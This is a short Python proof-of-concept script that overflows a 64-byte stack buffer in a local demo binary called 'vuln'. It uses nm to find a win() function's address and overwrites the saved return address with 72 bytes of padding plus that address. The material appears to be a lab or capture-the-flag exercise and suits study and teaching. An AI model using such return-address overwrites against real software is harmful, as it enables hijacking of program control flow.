#!/usr/bin/env python3
"""
poc.py — stack-smashing PoC against vuln
Layout (x86-64 System V ABI):
  [buf: 64 bytes][saved rbp: 8 bytes][return address: 8 bytes]
  offset to ret = 64 + 8 = 72
"""

import subprocess
import struct

# 1. find win() address
import subprocess, re

nm = subprocess.check_output(["nm", "vuln"]).decode()
match = re.search(r"([0-9a-f]+) T win", nm)
if not match:
    raise SystemExit("win() not found — compile with -no-pie")

win_addr = int(match.group(1), 16)
print(f"[*] win() @ {hex(win_addr)}")

# 2. build payload
OFFSET = 72           # 64-byte buf + 8-byte saved rbp
padding = b"A" * OFFSET
ret     = struct.pack("<Q", win_addr)   # little-endian 64-bit
payload = padding + ret

print(f"[*] payload ({len(payload)} bytes): {payload!r}")

# 3. trigger
result = subprocess.run(
    ["./vuln", payload],
    capture_output=True,
)
print(result.stdout.decode())
print(result.stderr.decode())
